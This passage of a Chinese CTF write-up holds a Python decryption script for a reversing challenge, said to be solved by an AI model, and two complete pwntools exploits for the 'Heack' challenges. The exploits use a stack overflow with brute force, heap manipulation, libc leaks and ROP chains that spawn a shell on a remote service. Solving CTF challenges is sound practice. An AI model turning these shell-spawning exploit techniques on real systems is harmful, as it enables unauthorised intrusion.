+最后大 G 老师秒杀
+
+![img](./img13.png)
+
+```python
+def decrypt_full():
+    """
+    根据反编译的C代码，解密给定的完整27字节数据。
+    """
+    # 来自C代码的密钥数组
+    byte_CE031 = [100, 71, 104, 112, 99, 50, 108, 122, 89, 87, 116, 108, 101, 81]
+
+    # 加密后的前24字节数据（来源：64位整数检查）
+    encrypted_v_64bit = [
+        0x0A409663A025150C,  # 假设前导 0
+        0x1FE106294065165C,
+        0xFC020A4C0E2C7290
+    ]
+
+    # 用户补充的最后3字节数据
+    encrypted_v_24bit = 0x2A324F
+
+    # --- 构建完整的27字节密文 ---
+    # 1. 添加前24个字节（小端序）
+    encrypted_data = bytearray()
+    for val in encrypted_v_64bit:
+        encrypted_data.extend(val.to_bytes(8, byteorder='little'))
+
+    # 2. 追加补充的最后3个字节（小端序）
+    encrypted_data.extend(encrypted_v_24bit.to_bytes(3, byteorder='little'))
+
+    # 检查数据长度是否为27
+    if len(encrypted_data) != 27:
+        raise ValueError(f"数据长度应为27，但实际为 {len(encrypted_data)}")
+
+    data_len = len(encrypted_data)
+    decrypted_data = bytearray(data_len)
+
+    # --- 循环解密每一个字节 ---
+    for i in range(data_len):
+        current_encrypted_byte = encrypted_data[i]
+
+        # 1. 逆向最终的异或操作
+        rotated_v11 = current_encrypted_byte ^ byte_CE031[(i + 4) % 14]
+
+        # 2. 逆向循环左移 (ROL) -> 执行循环右移 (ROR)
+        shift_val = byte_CE031[(i + 3) % 14] & 7
+        v11 = ((rotated_v11 >> shift_val) | (rotated_v11 << (8 - shift_val))) & 0xFF
+
+        # 3. 逆向加法和异或操作
+        if i < 14:
+            v10 = i
+        else:
+            v10 = i - 14
+
+        x = (2 * i) | 1
+        idx1 = x - 14 * ((147 * x) >> 11)
+
+        key_add = byte_CE031[idx1]
+        xor_result = (v11 - key_add) & 0xFF
+
+        key_xor_initial = byte_CE031[v10]
+        original_byte = xor_result ^ key_xor_initial
+
+        decrypted_data[i] = original_byte
+
+    return decrypted_data
+
+# --- 执行解密并打印最终结果 ---
+if __name__ == "__main__":
+    final_result = decrypt_full()
+
+    print(f"完整的解密后字节: {final_result}")
+
+    try:
+        final_decoded_string = final_result.decode('ascii')
+        print(f"最终解密的完整字符串: {final_decoded_string}")
+    except UnicodeDecodeError:
+        print("解密后的数据无法解码为ASCII字符串。")
+```
+
+# PWN
+
+## Heack
+
+直接打 fight，爆破 4 位
+
+```python
+#! /usr/bin/python3
+from pwn import *
+#pyright: reportUndefinedVariable=false
+
+context.os = 'linux'
+context.arch = 'amd64'
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+import tty
+elf=ELF("./vul2")
+libc=ELF("./lib/libc.so.6")
+
+debug = 1
+
+# p()
+
+def fight (cnt) :
+    io.sendlineafter("> ","1")
+    # p()
+    io.sendlineafter("shout:",cnt)
+
+def attack () :
+    io.sendlineafter("> ","2")
+
+def hp () :
+    io.sendlineafter("> ","3")
+
+def stats () :
+    io.sendlineafter("> ","4")
+
+def write (idx,size,cnt) :
+    io.sendlineafter("> ","5")
+    io.sendlineafter("Choose an option: ","1")
+    io.sendlineafter("Enter index (0-",str(idx))
+    io.sendafter("size (1-2048): ",str(size))
+    io.send(chr(tty.CEOF))
+    # sleep(0.5)
+    io.sendlineafter("Input your content: ",cnt)
+
+def destroy (idx) :
+    io.sendlineafter("> ","5")
+    io.sendlineafter("Choose an option: ","2")
+    io.sendlineafter("index to destroy (0",str(idx))
+
+def view (idx) :
+    io.sendlineafter("> ","5")
+    io.sendlineafter("Choose an option: ","3")
+    io.sendlineafter("index to view (0-",str(idx))
+
+def myexit () :
+    io.sendlineafter("> ","5")
+    io.sendlineafter("Choose an option: ","4")
+
+# sleep(0.5)
+# myexit()
+for j in range(0x10):
+    try:
+        if debug:
+            io = process('./vul2')
+            #io = remote('0.0.0.0',9999)
+        else:
+            io = remote('1.95.8.146',9999)
+
+        def p():
+            gdb.attach(proc.pidof(io)[0])
+
+        for i in range(0xa0):
+            attack()
+            hp()
+
+        # p()
+        fight(b"1"*259+b"\x17"+b'\x1a\x89')
+        # pause()
+        leak_prompt=io.recvuntil(b'[Attack]: ', timeout=1)
+
+        if b'[Attack]:' not in leak_prompt:
+            print(f"[!] Failed in round {j}, no [Attack] prompt!")
+            io.close()
+            continue  # 尝试下一轮爆破
+
+        libc_base=int(io.recvuntil(b'\n',drop=True),10)-0x204643
+        print("libc_base="+hex(libc_base))
+        break
+
+    except Exception as e:
+        print(f"[!] Exception in round {j}: {e}")
+        io.close()
+
+pause()
+# p()
+system=libc_base+libc.symbols[b'system']
+rdi=libc_base+0x000000000010f75b
+binsh=libc_base+next(libc.search(b'/bin/sh'))
+ret=libc_base+0x11BA69
+payload=p64(ret)+p64(rdi)+p64(binsh)+p64(system)
+fight(b"1"*259+b"\x17"+payload)
+
+io.interactive()
+```
+
+## heack_revenge
+
+game 里的特殊数字可以构造出 pop rbp 的指令，跳转到堆上，先泄露 heap 和 libc 的基址，再去写 rop
+
+```python
+#! /usr/bin/python3
+from pwn import *
+#pyright: reportUndefinedVariable=false
+
+context.os = 'linux'
+context.arch = 'amd64'
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+import tty
+elf=ELF("./vul2_revenge")
+libc=ELF("./lib/libc.so.6")
+
+debug = 0
+
+# p()
+
+def fight (cnt) :
+    io.sendlineafter("> ","1")
+    # p()
+    io.sendlineafter("shout:",cnt)
+
+def attack () :
+    io.sendlineafter("> ","2")
+
+def hp () :
+    io.sendlineafter("> ","3")
+
+def stats () :
+    io.sendlineafter("> ","4")
+
+def write (idx,size,cnt) :
+    io.sendlineafter("Choose an option: ","1")
+    io.sendlineafter("Enter index (0-",str(idx))
+    io.sendlineafter("size (1-2048): ",str(size))
+    io.sendlineafter("Input your content: ",cnt)
+
+def destroy (idx) :
+    io.sendlineafter("Choose an option: ","2")
+    io.sendlineafter("index to destroy (0",str(idx))
+
+def view (idx) :
+    io.sendlineafter("> ","5")
+    io.sendlineafter("Choose an option: ","3")
+    io.sendlineafter("index to view (0-",str(idx))
+
+def myexit () :
+    # io.sendlineafter("> ","5")
+    io.sendlineafter("Choose an option: ","4")
+
+if debug:
+    io = process('./vul2_revenge')
+    #io = remote('0.0.0.0',9999)
+else:
+    io = remote('1.95.8.146',19999)
+
+def p():
+    gdb.attach(proc.pidof(io)[0])
+
+# p()
+io.sendlineafter("> ","5")
+write(1,0x20,b'22')
+write(2,0x20,b'22')
+write(3,0x20,b'22')
+write(4,0x20,b'22')
+write(5,0x20,b'22')
+write(6,0x20,b'22')
+write(7,0x20,b'22')
+write(8,0x20,b'22')
+write(9,0x20,b'22')
+write(10,0x20,b'22')
+write(0,0x80,b'22')
+
+for i in range (7):
+    destroy(i+1)
+
+destroy(10)
+# destroy(9)
+destroy(8)
+write(11,0x500,b'22')
+
+myexit()
+fight(b"1"*35+b'\x37'+b'\x6a')
+# p()
+stats()
+io.recvuntil(b"[HP]: ")
+heap_base=int(io.recvuntil(b'\n',drop=True),10)-0x3e0
+print("heap_base="+hex(heap_base))
+
+io.recvuntil(b"[Combat Power]: ")
+libc_base=int(io.recvuntil(b'\n',drop=True),10)-0x203b40
+print("libc_base="+hex(libc_base))
+# p()
+io.sendlineafter("> ","5")
+# write(11,0x500,b'22')
+write(6,0x20,b'\x00'*0x10+p64(heap_base+0x480))
+destroy(0)
+# p()
+
+ret=libc_base+0x11BA69
+system=libc_base+libc.symbols[b'system']
+binsh=libc_base+next(libc.search(b'/bin/sh'))
+rdi=libc_base+0x000000000010f75b
+rsi=libc_base+0x0000000000110a4d
+rax=libc_base+0x00000000000dd237
+syscall=libc_base+0x11BA5F
+payload=p64(0)+p64(ret)+p64(rdi)+p64(binsh)+p64(rsi)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)
+# p()
+write(0,0x80,payload)
+# p()
+
+myexit()
+io.sendlineafter("> ","7")
+
+io.interactive()
+```
